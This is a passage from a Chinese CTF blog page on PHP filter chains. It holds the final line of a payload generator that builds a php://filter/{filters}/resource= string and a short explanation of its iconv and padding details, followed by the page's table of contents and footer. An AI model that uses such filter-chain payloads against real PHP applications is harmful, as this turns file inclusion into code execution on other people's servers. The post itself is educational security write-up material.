f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload
+
+上面为节选的核心代码，唯一不同的是，前面多了一些东西，和每次循环后面多了convert.iconv.UTF8.UTF7|，这个是为了去除空格，前面多的则是，当我们包含的文件为空时，使字符能够正常添加与解析，这两处细节影响不大，懂前面的添加字符即可
+</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">编码过滤器的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">想要构造的字符哪里来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">用于梭哈的脚本以及脚本的分析</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&text=Filter链之php"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&is_video=false&description=Filter链之php"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Filter链之php&body=Check out this article: http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filter链之php"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&name=Filter链之php&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&t=Filter链之php"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
